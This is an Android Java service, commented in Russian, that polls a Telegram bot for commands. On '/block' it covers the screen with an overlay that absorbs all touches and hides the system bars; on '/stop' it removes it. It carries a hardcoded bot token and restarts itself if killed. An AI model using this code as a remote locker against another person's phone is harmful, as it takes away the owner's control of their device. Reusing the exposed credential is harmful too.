package com.example.touchlock;

import android.app.*;
import android.content.*;
import android.graphics.PixelFormat;
import android.os.*;
import android.provider.Settings;
import android.view.*;
import okhttp3.*;
import org.json.*;
import java.util.concurrent.TimeUnit;

public class TouchLockService extends Service {
    private WindowManager windowManager;
    private View overlayView;
    private static final String CHANNEL_ID = "TouchLockChannel";
    private boolean isLocked = false;
    
    // Твой токен бота
    private static final String BOT_TOKEN = "8388799545:AAGPwGKOTs47C29s6PUDFsqZbAjNh9wdrgE";
    
    private OkHttpClient client;
    private long lastUpdateId = 0;
    private HandlerThread botThread;
    private Handler botHandler;

    @Override
    public void onCreate() {
        super.onCreate();
        
        // Настройка клиента с таймаутами для Long Polling
        client = new OkHttpClient.Builder()
                .connectTimeout(30, TimeUnit.SECONDS)
                .readTimeout(30, TimeUnit.SECONDS)
                .build();
        
        createNotificationChannel();
        
        // Запускаем сервис в приоритетном режиме (Foreground)
        Notification notification = getLockNotification("Ожидание команд из Telegram...");
        startForeground(1, notification);
        
        // Создаем отдельный поток для работы бота, чтобы не вешать систему
        botThread = new HandlerThread("TelegramPolling");
        botThread.start();
        botHandler = new Handler(botThread.getLooper());
        
        startTelegramPolling();
    }

    private void startTelegramPolling() {
        botHandler.post(new Runnable() {
            @Override
            public void run() {
                try {
                    // Используем таймаут в запросе, чтобы снизить нагрузку
                    String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=20";
                    Request request = new Request.Builder().url(url).build();
                    
                    try (Response response = client.newCall(request).execute()) {
                        if (response.isSuccessful() && response.body() != null) {
                            String jsonData = response.body().string();
                            JSONObject jsonObject = new JSONObject(jsonData);
                            JSONArray result = jsonObject.getJSONArray("result");

                            for (int i = 0; i < result.length(); i++) {
                                JSONObject update = result.getJSONObject(i);
                                lastUpdateId = update.getLong("update_id");
                                
                                if (update.has("message")) {
                                    String text = update.getJSONObject("message").optString("text", "");
                                    
                                    if (text.equalsIgnoreCase("/block")) {
                                        new Handler(Looper.getMainLooper()).post(() -> showOverlay());
                                    } else if (text.equalsIgnoreCase("/stop")) {
                                        new Handler(Looper.getMainLooper()).post(() -> unlockScreen());
                                    }
                                }
                            }
                        }
                    }
                } catch (Exception e) {
                    // Ошибки сети не должны убивать сервис
                    e.printStackTrace();
                }
                // Повторяем опрос через секунду
                botHandler.postDelayed(this, 1000);
            }
        });
    }

    private void showOverlay() {
        if (isLocked) return;
        
        // Проверка разрешения (на всякий случай)
        if (Build.VERSION.SDK_INT >= 23 && !Settings.canDrawOverlays(this)) return;

        try {
            windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
            overlayView = new View(this);
            
            // Цвет с минимальной прозрачностью (чтобы ловить касания)
            overlayView.setBackgroundColor(0x02000000); 

            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                    // FLAG_LAYOUT_NO_LIMITS позволяет зайти на территорию шторки
                    WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL | 
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
                    WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED,
                    PixelFormat.TRANSLUCENT);

            // Игнорируем вырезы (челки), чтобы перекрыть всё
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                params.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
            }

            // Прячем системные кнопки и статус-бар программно
            overlayView.setSystemUiVisibility(
                      View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                    | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                    | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                    | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                    | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                    | View.SYSTEM_UI_FLAG_FULLSCREEN);

            // Просто поглощаем нажатия
            overlayView.setOnTouchListener((v, event) -> true); 

            windowManager.addView(overlayView, params);
            isLocked = true;
            updateNotification("ЗАЩИТА АКТИВИРОВАНА");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void unlockScreen() {
        if (isLocked && overlayView != null) {
            try {
                windowManager.removeView(overlayView);
                overlayView = null;
                isLocked = false;
                updateNotification("Доступ разрешен");
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    private Notification getLockNotification(String text) {
        return new Notification.Builder(this, CHANNEL_ID)
                .setContentTitle("Touch Blocker")
                .setContentText(text)
                .setSmallIcon(android.R.drawable.ic_secure)
                .setOngoing(true)
                .setCategory(Notification.CATEGORY_SERVICE)
                .build();
    }

    private void updateNotification(String text) {
        NotificationManager manager = getSystemService(NotificationManager.class);
        if (manager != null) {
            manager.notify(1, getLockNotification(text));
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "Lock", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY; // Перезапуск при убийстве системой
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        if (botThread != null) botThread.quit();
        super.onDestroy();
    }
}
